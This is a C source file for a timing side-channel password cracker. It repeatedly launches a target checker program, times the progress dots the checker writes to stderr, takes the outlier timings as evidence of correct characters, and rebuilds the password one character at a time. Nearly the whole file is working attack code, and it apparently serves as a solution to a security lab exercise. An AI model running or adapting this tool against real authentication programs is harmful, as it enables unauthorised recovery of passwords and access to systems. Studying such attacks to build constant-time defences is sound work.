#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

inline long usecdifference (long start, long end) {
	long result = end - start;
	if (end < start) {
		// Everything we time will take less than a second.
		result += 1000000;
	}
	return result;
}

int findlargest (unsigned char *counts, int length) {
	int i, highind, highval = 0, tied = 1;
	for (i = 0; i < length; ++i) {
		if (counts[i] > highval) {
			highval = counts[i];
			highind = i;
			tied = 0;
		} else if (counts[i] == highval) {
			tied = 1;
		}
	}

	return tied ? -1 : highind;
}

int qs_partition (long *array, int start, int end) {
	int pivot = array[(start + end) / 2];
	int i = start - 1, j = end + 1;

	while (1) {
		do {
			++i;
		} while (array[i] < pivot);
		do {
			--j;
		} while (array[j] > pivot);
		if (i < j) {
			long temp = array[i];
			array[i] = array[j];
			array[j] = temp;
		} else {
			return j;
		}
	}
}

void qs_helper (long *array, int start, int end) {
	int split = qs_partition(array, start, end);

	if (start < split) {
		qs_helper(array, start, split);
	}
	if (end > split + 1) {
		qs_helper(array, split + 1, end);
	}
}

void quicksort (long *array, int length) {
	qs_helper(array, 0, length - 1);
}

pid_t startguesser (int fd[3], char *path, char *file, char *str) {
	int infd[2], outfd[2], errfd[2];
	pid_t child;
	// Create pipes
	if (pipe(infd) == -1 || pipe(outfd) == -1 || pipe(errfd) == -1) {
		perror("Error creating pipes");
		exit(EXIT_FAILURE);
	}

	if (!(child = fork())) {
		// Child
		dup2(infd[0], 0);
		  close(infd[0]);
		  close(infd[1]);
		dup2(outfd[1], 1);
		  close(outfd[0]);
		  close(outfd[1]);
		dup2(errfd[1], 2);
		  close(errfd[0]);
		  close(errfd[1]);
		if (execl(path, path, file, str, NULL) == -1) {
			perror("Error executing guesser");
			exit(EXIT_FAILURE);
		}
		exit(EXIT_SUCCESS);
	}

	// Parent
	if (child == -1) {
		perror("Error forking");
		exit(EXIT_FAILURE);
	}

	// Set pipe array and return
	fd[0] = infd[1];
	  close(infd[0]);
	fd[1] = outfd[0];
	  close(outfd[1]);
	fd[2] = errfd[0];
	  close(errfd[1]);
	return child;
}

long teststring (char *path, char *file, char *str) {
	int numchars = strlen(str);
	if (numchars <= 1) {
		return -1;
	}

	int fd[3], i;
	struct timeval temp;
	long start = 0, end = 0;
	FILE *errfile;
	char current;

	// Start the guesser and open the stderr fd
	startguesser(fd, path, file, str);
	close(fd[0]);
	close(fd[1]);
	errfile = fdopen(fd[2], "r");
	setvbuf(errfile, NULL, _IONBF, 0);

	// Time each '.' output
	i = 0;
	while ((current = fgetc(errfile)) != EOF) {
		if (current == '.') {
			if (i >= numchars - 2) {
				gettimeofday(&temp, NULL);
				if (i == numchars - 2) {
					start = temp.tv_usec;
				} else {
					end = temp.tv_usec;
				}
			}
			++i;
		} else if (current == 'i') {
			close(fd[2]);
			return -2;
		}
	}

	close(fd[2]);
	return usecdifference(start, end);
}

void markoutliers (long *in, unsigned char *out, int length) {
	long sorted[length];
	memcpy(sorted, in, length * sizeof(long));
	quicksort(sorted, length);

	int i, difference, threshhold, highval = 0;
	for (i = 1; i < 6; ++i) {
		difference = sorted[i] - sorted[i - 1];
		if (difference > highval) {
			highval = difference;
			threshhold = sorted[i];
		}
	}

	for (i = 0; i < length; ++i) {
		if (in[i] < threshhold) {
			++out[i];
		}
	}
}

char guesschar (char *path, char *file, char *known, char *charlist) {
	int numchars = strlen(charlist);
	int index = strlen(known);
	long times[numchars];
	unsigned char counts[numchars];

	known[index + 1] = '!';
	known[index + 2] = '\0';

	int i, j = 0;
	for (i = 0; i < numchars; ++i) {
		counts[i] = 0;
	}

	int highind;
	while ((highind = findlargest(counts, numchars)) == -1 && j <= 5) {
		for (i = 0; i < numchars; ++i) {
			known[index] = charlist[i];
			times[i] = teststring(path, file, known);
		}
		++j;
		markoutliers(times, counts, numchars);
	}

	if (highind == -1) {
		known[index] = '\0';
		return 0;
	} else {
		known[index + 1] = '\0';
		known[index] = charlist[highind];
		return charlist[highind];
	}
}

char *findstring (char *path, char *file, char *charlist) {
	char *str = (char*)malloc(50);
	str[0] = '\0';
	int i = 0;
	while (guesschar(path, file, str, charlist) != 0 && i < 48) {
		if (teststring(path, file, str) == -2) {
			return str;
		}
		++i;
	}
	return 0;
}

int main (int argc, char **argv) {
	char *charlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	FILE *fd;

	if (argc != 3) {
		fprintf(stderr, "Usage: %s path file\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	if (!(fd = fopen(argv[2], "r"))) {
		perror("Warning: Could not open file");
	} else {
		fclose(fd);
	}

	signal(SIGCHLD, SIG_IGN);
	char *str = findstring(argv[1], argv[2], charlist);
	printf("%s\n", str == 0 ? "Sorry, the password could not be found\n" : str);

	return EXIT_SUCCESS;
}

